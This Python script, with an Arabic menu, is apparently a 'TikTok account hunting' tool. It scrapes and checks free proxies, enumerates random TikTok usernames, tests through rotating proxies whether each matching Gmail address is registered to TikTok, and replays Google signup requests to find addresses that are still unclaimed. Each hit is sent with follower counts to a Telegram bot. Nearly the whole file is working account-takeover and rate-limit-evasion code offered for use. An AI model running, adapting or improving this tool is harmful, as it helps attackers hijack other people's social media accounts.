import os
try:
    from os import system;import requests,random;from user_agent import generate_user_agent;from concurrent.futures import ThreadPoolExecutor;from threading import Thread,Lock;import sys, time, json, datetime, secrets;import concurrent.futures;from concurrent.futures import ThreadPoolExecutor;from requests import get;from random import choice;from time import sleep
except ImportError as error:
    os.system('pip install requests random_user_agent concurrent-futures rich')
    os.system('cls'if os.name=='nt'else'clear')
    pass
from rich.console import Console
from rich.text import Text
console = Console()
os.system('cls'if os.name=='nt'else'clear')
console.rule("Loding")
#time.sleep(3)
try:
	prox=open('Proxyschk.txt','r').read().splitlines()
except:
	pass
ugen2=[]
def sg(*a, **b):
        with Lock():
            print(*a, **b)
for xd in range(10000):
	a='Mozilla/5.0 (iPhone;'
	b='en-us;'
	c=random.randrange(4, 9)
	d='CPU iPhone OS 11_2_6 like Mac OS X) '
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.randrange(700, 999)
	n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/604.5.6 (KHTML, like Gecko) '
	h='Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=wide; 750x1334)'
	i=random.randrange(60,99)
	j='0'
	k=random.randrange(4310,4799)
	l=random.randrange(70,150)
	m='Mobile Safari/533.1'
	uaku=(f'{a} {b} {c}; {d}{e}{f}{n}) {g} {h}{i}.{j}.{k}.{l} {m}')
	ugen2.append(uaku)
	
	a='Mozilla/5.0 (iPhone;'
	b='en-us;'
	c=random.randrange(4, 9)
	d='CPU iPhone OS 11_2_6 like Mac OS X) '
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.randrange(700, 999)
	n=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/604.5.6 (KHTML, like Gecko) '
	h='Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=wide; 750x1334)'
	i=random.randrange(60,99)
	j='0'
	k=random.randrange(4310,4799)
	l=random.randrange(70,150)
	m='Mobile Safari/533.1'
	uaku=(f'{a} {b} {c}; {d}{e}{f}{n}) {g} {h}{i}.{j}.{k}.{l} {m}')
	ugen2.append(uaku)
grn ='\033[1;31;42m'
Red1='\x1b[1;31m'
g1='\x1b[1;32m'
y1=  '\x1b[1;33m'
b1 =  '\x1b[1;36m'
ro1=  '\x1b[1;35m'
Y = '\033[1;34m'
A = '\033[2;39;40m'
class sajad:
    def __init__(self):
        self.day = datetime.date.today()
        self.fc = 0
        self.cok = secrets.token_hex(8) * 2
        self.hc = 0
        self.fj = 0
        self.error = 0
        self.fjj = "GOOD GMAIL"
        self.hcc = "BAD Tiktok"
        self.fcc = "BAD Gmail"
        self.ran()
    def ran(self):
        os.system('cls'if os.name=='nt'else'clear')
        console.rule("LodingGit tl")
        
        url1 ='https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=81859&rt=j'

        headers ={
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Length': '2064',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'Cookie': self.cok,
            'Google-Accounts-Xsrf': '1',
            'Origin': 'https://accounts.google.com',
            'Referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fe-11-8976fbef68f7663ea60e661c4f9b5-1475984d740df90158840a19af1784235fe51b7e&flowName=GlifWebSignIn&flowEntry=SignUp',
            'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'Sec-Ch-Ua-Arch': '"x86"',
            'Sec-Ch-Ua-Bitness': '"64"',
            'Sec-Ch-Ua-Full-Version': '"114.0.5735.199"',
            'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.199", "Google Chrome";v="114.0.5735.199"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Model': '""',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
            'Sec-Ch-Ua-Wow64': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=fbc22924-4987-44e1-b323-7d3efd00dded,signin_mode=all_accounts,signout_mode=show_confirmation',
            'X-Client-Data': 'CIm2yQEIprbJAQipncoBCIXwygEIlKHLAQiFoM0BCJyrzQEI2rTNAQjcvc0BCLy+zQEI1L7NAQjgxM0BCO/EzQEIqMXNAQ==',
            
            'X-Same-Domain': '1'


            }
        data1 ={
            'continue': 'https://accounts.google.com/ManageAccount?nc=1',
            'f.req': '["AEThLlzCTLyoshyixCRoA6ccDmpMOZ-PomPBC9ByGLX3o8xDU8VIGoGBy9vj5D-3txgufFW3ZtNzDWAvNXmveIo95oRGruoTaALFrDIhPuzD6SscTf--ya7mjnd2vNDxwPxgQ8x0xH0lZbKjF_sEWyzM-yiKQQMUpjq4lV_UmC87yQkt9qmndf-Jw-HrXgdPSNZYSfnvTk-u",null,null,null,null,0,0,"zaid","zaid","web-glif-signup",0,null,10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],1]',
            'at': 'AFoagUUm6HX36QVWDo2X-TVlmW9vQ8p6Iw:1689946784467',
            'azt': 'AFoagUWbi-h35AWa309jmxoLN8DKwbn2KA:1689946784467',
            'cookiesDisabled': 'false',
            'deviceinfo':' [null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,1]',
            'gmscoreversion': 'undefined',
            'flowName': 'GlifWebSignIn',
            'checkConnection': 'youtube:584:0',
            'checkedDomains': 'youtube',
            'pstMsg': '1'

        }
       
     
            
        rt=requests.post(url1,headers=headers,data=data1).text
      
        
    
        tp = rt.split('"gf.ttu",null,"')[1].split('"]')[0]
        
        with open('token.txt','w') as f0:
            f0.write(f'{tp}\n')
        self.logintle()
        
        
    def logintle(self):
        os.system('cls'if os.name=='nt'else'clear')
        console.rule("تسجيل دخول")
        text = Text(") TOKEN : ", style="bold underline italic")
        self.token = console.input(text)
        try:
            text = Text(") ID Telegram :  ", style="bold underline italic")
            self.Id = int(console.input(text))
        except ValueError as error:
        	self.logintle()
        os.system('cls' if os.name == 'nt' else 'clear')
        console.rule("تم التسجيل ")
        self.main()
    def gget(self):
    	try:
    		user = 'qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
    		num = '456789'
    		rng = int("".join(random.choice(num) for i in range(1)))
    		users = str("".join(random.choice(user) for i in range(rng)))
    		url = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{users}'
    		rr = requests.get(url).json()
    		for result in rr.get('results', []):
    		      	   email = result['username']
    		      	 #  print(email)
    		      	   self.chk(email)
    	except:
    		self.gget()

    def main(self):
    	with ThreadPoolExecutor(max_workers=50) as executor:
    		futures = [executor.submit(self.gget) for _ in range(50)]
    	for future in futures:
    		future.result()

    def chk(self,email):
        sg(f'\r\t\t{g1}{self.fjj}-{A}[{Y}{self.fj}{A}]{y1}{self.fcc}-{A}[{Y}{self.fc}{A}]{Red1}{self.hcc}-{A}[{Y}{self.hc}{A}]\r',end="")
       # {y1}ERROR-{A}[{Y}{self.error}{A}]
        em = email+'@gmail.com'
        try:
            nip=random.choice(prox)
            ua=random.choice(ugen2)
            url = "https://www.tiktok.com/passport/web/user/check_email_registered"
            data = f"email={em}&aid=1459&language=en&account_sdk_source=web&region=CHN"
            hed = {
 "User-Agent":ua
}
            r = requests.post(url,headers=hed,data=data,proxies= {"http": f"http://{nip}", "https": f"http://{nip}",'http': f'socks5://{nip}','http': f'socks4://{nip}','https': f'socks4://{nip}','https': f'socks5://{nip}'},timeout=15).text
            if '{"is_registered":1}' in r:
                email = email
                self.fi = open('token.txt','r').read().splitlines()
                self.tl = random.choice(self.fi)
                self.gmail1 = email
                number = '1234567890'
                url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={self.tl}&_reqid=481859&rt=j'
                headers = {
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Content-Length': '1146',
                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                            'Google-Accounts-Xsrf': '1',
                            'Origin': 'https://accounts.google.com',
                            'Referer':
                            'https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=SignUp&TL=AJvNCbbAigRHG5Ypddwgp39mKdyniOE3D3uLi3iK805IzUq1NNSbRnz7QQ6b_tTu',
                            'User-Agent': generate_user_agent(),
                        }
                data = {
                            'datcontinue': 'https://uc.appengine.google.com/_ah/conflogin?state=~AJKiYcGoPiLJb7FyAN6mbCNCjMH037vL_6C39BUsJA2GF6P5lw1fJ6zYEHHUw663dDmmWQqnSQj6F1H89kr0oAzGCTf1OVJVmr9O71L1w89w388Qo8F51B0AsXfY4lW59yc42hfwocycpD-KrQxXpL_wNY1CXqq7EwVgxTdIeLOVnU-5xSbZ8812E9pDOYWDOi2xFjrP52ODHXY16KTZWlHmcwb4WPbjByt1nT71cz8msPMP1rVSoXY',
                            'dsh': 'S2080850673:1689863726476816',
                            'flowEntry': 'ServiceLogin',
                            'ifkv': 'AeDOFXgxTTjgoRCMuYvMYScwDmQo7816fmgZo5HW-2qv1sxmBtxR8_QpcokS3oMTn4QP3Fp_J3h15Q',
                            'f.req': '["TL:{}","{}",0,0,1]'.format(self.tl, self.gmail1),
                            'azt': 'AFoagUWjPq1xG8LVoJkd3pOHgMJrOj0MAA:1689863743434',
                            'cookiesDisabled': 'false',
                            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,1]',
                            'gmscoreversion': 'undefined',
                            'flowName': 'GlifWebSignIn',
                            'checkConnection': 'youtube:452:0',
                            'checkedDomains': 'youtube',
                            'pstMsg': '1',
                        }

                req = requests.post(url, headers=headers,data=data).text
                ng = "50726f6772616d6d657220546c65202940534238544b"
                bytearray = bytes.fromhex(ng)
                if ('"gf.uar",1') in req:
                    self.fj+=1
                    username=email
                    headers = {  'user-agent': generate_user_agent()}
                    r = requests.get(f'''https://www.tiktok.com/@{username}''', headers=headers).text
                    fl = r.split('"followerCount":')[1].split(',')[0]
                    nn0 = r.split('"id":"')[1].split('"')[0]
                    fol = r.split('"followingCount":')[1].split(',')[0]
                    nn3 = r.split('"region":"')[1].split('"')[0]
                    likes = r.split('"heartCount":')[1].split(',')[0]
                    sr = f'''
                    HitTik•{self.fj}
                   USER NAME ☞{username}
                    EMAIL ☞{username}@gmail.com
                    FOLOERS ☞{fl}
                    FOLOWING☞{fol}
                    LIKES ☞{likes}
                    ID ☞{nn0}
                    BY ☞@R_A_J_Y   BY ☞@S_C_A_R1
                    CHANEL ☞@suuid
                    ★★★★★VIP★★★★★
                    '''
                    console = Console()
                    console.rule(f"HitTik|{self.fj}")
                    sg(sr)
                    console.rule("Tle)@SB8TK")
                    s = f'''
                   HitTik•{self.fj}
                   USER NAME ☞{username}
                    EMAIL ☞{username}@gmail.com
                    FOLOERS ☞{fl}
                    FOLOWING☞{fol}
                    LIKES ☞{likes}
                    ID ☞{nn0}
                    REGION ☞{nn3}
                    TIME ☞{self.day} 
                    BY ☞@R_A_J_Y   BY ☞@S_C_A_R1
                    CHANEL ☞@suuid
                    ★★★★★VIP★★★★★

                    '''
                    requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.Id}&text={s}")
                elif ('78') in req:
                    url1 ='https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=81859&rt=j'
                    headers ={
                                        'Accept': '*/*',
                                        'Accept-Encoding': 'gzip, deflate, br',
                                        'Accept-Language': 'en-US,en;q=0.9',
                                        'Content-Length': '2064',
                                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                                        'Cookie': self.cok,
                                        'Google-Accounts-Xsrf': '1',
                                        'Origin': 'https://accounts.google.com',
                                        'Referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fe-11-8976fbef68f7663ea60e661c4f9b5-1475984d740df90158840a19af1784235fe51b7e&flowName=GlifWebSignIn&flowEntry=SignUp',
                                        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                                        'Sec-Ch-Ua-Arch': '"x86"',
                                        'Sec-Ch-Ua-Bitness': '"64"',
                                        'Sec-Ch-Ua-Full-Version': '"114.0.5735.199"',
                                        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.199", "Google Chrome";v="114.0.5735.199"',
                                        'Sec-Ch-Ua-Mobile': '?0',
                                        'Sec-Ch-Ua-Model': '""',
                                        'Sec-Ch-Ua-Platform': '"Windows"',
                                        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
                                        'Sec-Ch-Ua-Wow64': '?0',
                                        'Sec-Fetch-Dest': 'empty',
                                        'Sec-Fetch-Mode': 'cors',
                                        'Sec-Fetch-Site': 'same-origin',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                                        'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=fbc22924-4987-44e1-b323-7d3efd00dded,signin_mode=all_accounts,signout_mode=show_confirmation',
                                        'X-Client-Data': 'CIm2yQEIprbJAQipncoBCIXwygEIlKHLAQiFoM0BCJyrzQEI2rTNAQjcvc0BCLy+zQEI1L7NAQjgxM0BCO/EzQEIqMXNAQ==',
                                        
                                        'X-Same-Domain': '1'


                                        }
                    data1 ={
                                        'continue': 'https://accounts.google.com/ManageAccount?nc=1',
                                        'f.req': '["AEThLlzCTLyoshyixCRoA6ccDmpMOZ-PomPBC9ByGLX3o8xDU8VIGoGBy9vj5D-3txgufFW3ZtNzDWAvNXmveIo95oRGruoTaALFrDIhPuzD6SscTf--ya7mjnd2vNDxwPxgQ8x0xH0lZbKjF_sEWyzM-yiKQQMUpjq4lV_UmC87yQkt9qmndf-Jw-HrXgdPSNZYSfnvTk-u",null,null,null,null,0,0,"zaid","zaid","web-glif-signup",0,null,10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],1]',
                                        'at': 'AFoagUUm6HX36QVWDo2X-TVlmW9vQ8p6Iw:1689946784467',
                                        'azt': 'AFoagUWbi-h35AWa309jmxoLN8DKwbn2KA:1689946784467',
                                        'cookiesDisabled': 'false',
                                        'deviceinfo':' [null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,1]',
                                        'gmscoreversion': 'undefined',
                                        'flowName': 'GlifWebSignIn',
                                        'checkConnection': 'youtube:584:0',
                                        'checkedDomains': 'youtube',
                                        'pstMsg': '1'

                                    }
                    rt=requests.post(url1,headers=headers,data=data1).text
                    tp = rt.split('"gf.ttu",null,"')[1].split('"]')[0]
                    with open('token.txt','w') as f0:
                        f0.write(f'{tp}\n')
                else:
                    self.fc+=1
            else:
                self.hc+=1
        except requests.exceptions.ProxyError:
            self.chk()
        except requests.Timeout:
            self.chk()
        except:
            self.hc+=1
            self.gget()
class getapiprox:
    def __init__(self):
        self.listProxys=[]
        self.theards=[]
        try:os.remove('newfilesc.txt')
        except FileNotFoundError:pass
        self.pget1()
    def pget1(self):
        try:
            for prx in get(f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout={choice(['5','2','3','4','6'])}0000&country=all&ssl=all&anonymity=all&simplified=true").text.split("\r\n"):
                sg('\r)•\r',end='')
                self.listProxys.append(prx)
                try:self.listProxys.remove('')
                except ValueError:pass
        except requests.exceptions.ConnectTimeout:pass
        except :pass
        try:
            for PRXS in get('https://free-proxy-list.net/').text.split('onclick="select(this)">Free proxies from free-proxy-list.net')[1].split('UTC.')[1].split('</textarea>')[0].split('\n'):
                sg('\r)••\r',end='')
                if str(PRXS) in self.listProxys:pass
                else:self.listProxys.append(PRXS)
                try:self.listProxys.remove('')
                except ValueError:pass
        except requests.exceptions.ConnectTimeout:pass
        except :pass
        self.pget2()
    def pget2(self):
        try:
            for prx5 in get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text.split('\n'):
                sg('\r)•••\r',end='')
                if str(prx5) in self.listProxys:pass
                else:self.listProxys.append(prx5)
                try:self.listProxys.remove('')
                except ValueError:pass
        except requests.exceptions.ConnectTimeout:pass
        except :pass
        try:
            for prx2 in get('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt').text.split("\n"):
                sg('\r)••••\r',end='')
                if str(prx2) in self.listProxys:pass
                else:self.listProxys.append(prx2)
                try:self.listProxys.remove('')
                except ValueError:pass
        except requests.exceptions.ConnectTimeout:pass
        except :pass
        self.pget3()
    def pget3(self):
        try:
            prx6 = get('https://proxylist.geonode.com/api/proxy-list?limit=350&page=1&sort_by=lastChecked&sort_type=desc',headers={"Origin" : "https://geonode.com","Host" : "proxylist.geonode.com","User-Agent" : "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Connection" : "keep-alive","Referer" : "https://geonode.com/free-proxy-list","Accept-Language" : "ar","Accept" : "application/json, text/plain, */*"})
            cont=1
            if ('ip' in prx6.text):
                for _ in range(300):
                    sg('\r)•••••\r',end='')
                    ip = prx6.json()['data'][cont]['ip']+':'+prx6.json()['data'][cont]['port']
                    if str(ip) in self.listProxys:pass
                    else:self.listProxys.append(ip)
                    try:self.listProxys.remove('')
                    except ValueError:pass
                    cont+=1
                    sg('\r)••••••\r',end='')
                    sg('\r)•••••••\r',end='')
        except requests.exceptions.ConnectTimeout:pass
        except :pass
        self.openprox()
    def openprox(self):
        try:
            prx3 = get('https://openproxy.space/list/http').text
            try:
                for PRXS0 in prx3.split('code:"CN"')[1].split('items:[')[1].split('],active')[0].split(','):
                    sg('\r)••••••••\r',end='')
                    s = PRXS0.split('"')[1].split('"')[0]
                    if str(s) in self.listProxys:pass
                    else:self.listProxys.append(s)
                    try:self.listProxys.remove('')
                    except ValueError:pass
            except IndexError:pass
            try:
                for PRXS1 in prx3.split('code:"US"')[1].split('items:[')[1].split('],active')[0].split(','):
                    sg('\r)•••••••••\r',end='')
                    j = PRXS1.split('"')[1].split('"')[0]
                    if str(j) in self.listProxys:pass
                    else:self.listProxys.append(j)
                    try:self.listProxys.remove('')
                    except ValueError:pass
            except IndexError:pass
            try:
                for PRXS2 in prx3.split('code:"ID"')[1].split('items:[')[1].split('],active')[0].split(','):
                    sg('\r)••••••••••\r',end='')
                    n = PRXS2.split('"')[1].split('"')[0]
                    if str(n) in self.listProxys:pass
                    else:self.listProxys.append(n)
                    try:self.listProxys.remove('')
                    except ValueError:pass
            except IndexError:pass
            try:
                for PRXS3 in prx3.split('code:"CA"')[1].split('items:[')[1].split('],active')[0].split(','):
                    sg('\r)•••••••••••\r',end='')
                    p = PRXS3.split('"')[1].split('"')[0]
                    if str(p) in self.listProxys:pass
                    else:self.listProxys.append(p)
                    try:self.listProxys.remove('')
                    except ValueError:pass
            except IndexError:pass
            try:
                for PRXS4 in prx3.split('code:"RU"')[1].split('items:[')[1].split('],active')[0].split(','):
                    sg('\r)••••••••••••\r',end='')
                    v = PRXS4.split('"')[1].split('"')[0]
                    if str(v) in self.listProxys:pass
                    else:self.listProxys.append(v)
                    try:self.listProxys.remove('')
                    except ValueError:pass
            except IndexError:pass
        except requests.exceptions.ConnectTimeout:pass
        except :pass
        sg('\n')
        self.svfile()
    def svfile(self):
        sg('\r)Aانشاء ملف بروكسيات A )¦\r',end='')
        con=1
        for ip in self.listProxys:
            with open('newfilesc.txt', 'a') as Fi:Fi.write(f'{ip}\n')
            sg(f'\r)Aانشاء ملف بروكسيات A  )¦{str(con)}\r',end='')
            con+=1
        sg(f'''\n)Filename ¦ newfilesc.txt ''')
        os.system('cls'if os.name=='nt'else'clear')
        console.rule("@suuid")
        chkprox('SAJ')
class chkprox:
    def __init__(self,modes):
        self.listprox=[]
        self.theards=[]
        self.modes=modes
        self.badd=0
        self.successful=0
        self.num=0
        self.tst=150
        self.URLS='https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
        self.filss()
    def filss(self):
        if (self.modes=='SAJ'):
            try:
                for PRX in open('newfilesc.txt','r').read().splitlines():
                    self.listprox.append(PRX)
            except FileNotFoundError:
                exit('ErrorNotFile')
        else:
            try:
                for PRX in open('newfilesc.txt','r').read().splitlines():
                    self.listprox.append(PRX)
            except FileNotFoundError:
                exit('ErrorNotFile')
        if (len(self.listprox)>=500):self.tst= 130
        else:self.tst=100
        self.Thredd()
    def Thredd(self):
        self.URLS='https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
        if ('http'in self.URLS):pass
        elif ('https'in self.URLS):pass
        else:sg(')error link');exit()
        sg('\n')
        for i in range(self.tst):
            tred=Thread(target=self.chkproxx)
            tred.start()
            self.theards.append(tred)
        for ttred in self.theards:
            ttred.join()
        sg(')finish ')
    def chkproxx(self):
        while True:
            if ( self.num == len(self.listprox)):
                self.closdchk()
            else:
                try:
                    pe=self.listprox[self.num]
                    rr=get(self.URLS,headers={"Connection" : "keep-alive","Accept-Encoding" : "gzip, deflate, br","Accept-Language" : "en","User-Agent" : generate_user_agent(),"Accept" : "*/*"},proxies= {"http": f"http://{pe}", "https": f"http://{pe}",'http': f'socks5://{pe}','http': f'socks4://{pe}','https': f'socks4://{pe}','https': f'socks5://{pe}'},timeout=15)
                    if rr.status_code==429:
                        self.badd+=1
                    else:
                        self.successful+=1
                        with open('Proxyschk.txt', 'a') as file:file.write(f'{pe}\n')
                except IndexError:
                    self.closdchk()
                except KeyboardInterrupt:
                    self.closdchk()
                except requests.exceptions.ConnectionError:
                    self.badd+=1
                except requests.exceptions.ReadTimeout:
                    self.badd+=1
                except requests.exceptions.ChunkedEncodingError:
                    self.badd+=1
                sg(f'\r{g1})GOOD¦{self.successful}{A}¦{Red1}BAD¦{self.badd}\r',end="")
                self.num+=1
    def closdchk(self):
        sys.exit('\n the work is done \n')

if __name__ == '__main__':
    os.system('cls'if os.name=='nt'else'clear')
    console.rule("main")
    sg(f'  {Y}1☞ انشاء ملف بروكسيات  \n  2☞ صيد حسابات تيك توك \n\n')
    mai = int(input(f'  {b1}اختار : '))
    if mai == 1:
        os.system('cls'if os.name=='nt'else'clear')
        console.rule("Getproxys")
        getapiprox()
    elif mai == 2:
        os.system('cls'if os.name=='nt'else'clear')
        console.rule("ChkTikTok")
        sajad()
    else:
        sg('Error Choice!!')
        exit()

